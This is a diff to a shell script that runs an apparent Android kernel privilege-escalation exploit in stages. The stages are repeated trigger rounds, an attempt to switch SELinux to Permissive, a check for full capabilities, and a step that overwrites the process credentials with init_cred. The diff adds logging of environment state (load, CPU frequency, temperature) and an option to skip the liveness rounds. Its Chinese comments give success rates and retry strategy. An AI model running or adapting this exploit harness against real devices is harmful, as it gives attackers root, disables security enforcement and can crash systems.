@@ -21,9 +21,24 @@ am kill-all 2>&1 | tail -1 >> $LOG
 
 getfield() { grep -o "$1=[0-9a-f]*" $STATUS 2>/dev/null | cut -d= -f2 | head -1; }
 
-# ---------- R0: 判活 (3 轮) ----------
+# logenv: 每轮触发前记环境 (裁"热窗假说": 灭是否伴随低频/高温, 见 LIVENESS_VERDICT)
+logenv() {
+  echo "env[$(date +%H:%M:%S)] load=$(cat /proc/loadavg 2>/dev/null) \
+freq0=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null) \
+freq1=$(cat /sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq 2>/dev/null) \
+thermal=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)" >> $LOG
+}
+
+# ---------- R0: 判活 (3 轮) — SKIP_R0=1 可跳过 (模式C策略) ----------
+# R0✅ 按设计=崩一台(牺牲boot+脚本中断)。判活连灭日: STAGE-R 落地自带无崩
+# 判活(状态文件 CapEff)且是实质进展 → SKIP_R0=1 直接跑后续; R0 降级为
+# "STAGE-R 4轮全灭后的诊断手段"。用法: SKIP_R0=1 sh test_mt49_root.sh
 R0OK=0
+if [ "$SKIP_R0" = "1" ]; then
+  echo "R0 skipped (SKIP_R0=1): STAGE-R self-evidencing, R0 as fallback diag" >> $LOG
+else
 for R0N in 1 2 3; do
+  logenv
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
@@ -36,12 +51,14 @@ for R0N in 1 2 3; do
   if [ "$BID" != "$BID0" ]; then R0OK=1; echo "R0: ALIVE (round=$R0N)" >> $LOG; break; fi
   sleep 3
 done
-[ $R0OK -eq 1 ] || { echo "!! R0 3轮全灭 — 原语未激活, 换 boot" >> $LOG; exit 1; }
+[ $R0OK -eq 1 ] || { echo "!! R0 3轮全灭 — 原语未激活, 换 boot (或 SKIP_R0=1 让 STAGE-R 自证)" >> $LOG; exit 1; }
+fi
 
 # ---------- ENF: 翻 Permissive (best-effort, 失败不阻断) ----------
 for E in 1 2 3; do
   EF=$(getenforce 2>/dev/null)
   case "$EF" in *ermissive*) break;; esac
+  logenv
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
@@ -61,6 +78,7 @@ KOARG=""
 # 第 1 轮 fork 子进程(存活 8min, 持续写状态文件); 未落地则外部模式补打(幂等)
 # 单发命中 ~20-40% → 4 轮累计 59-87%; 每轮独立进程, 不破一进程一写
 for RA in 1 2 3 4; do
+  logenv
   rm -f $RUNLOG
   TASKARG=""
   [ $RA -gt 1 ] && TASKARG="PSELECT_TASK=$(getfield task)"
@@ -92,13 +110,14 @@ done
 CAPE=$(getfield CapEff)
 case "$CAPE" in
   *1fffff*) : ;;
-  *) echo "!! STAGE-R 4轮未落地 — 换 boot 重跑全套" >> $LOG; exit 1 ;;
+  *) echo "!! STAGE-R 4轮未落地 — 若本轮 SKIP_R0=1: 先补一轮 R0 诊断(活→PTR几何没中,继续; 灭→换 boot)" >> $LOG; exit 1 ;;
 esac
 
 # ---------- STAGE-C: cred → init_cred (外部模式, 同一子进程) ----------
 TASK=$(getfield task)
 echo "STAGE-C task=$TASK" >> $LOG
 for CA in 1 2 3 4; do
+  logenv
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
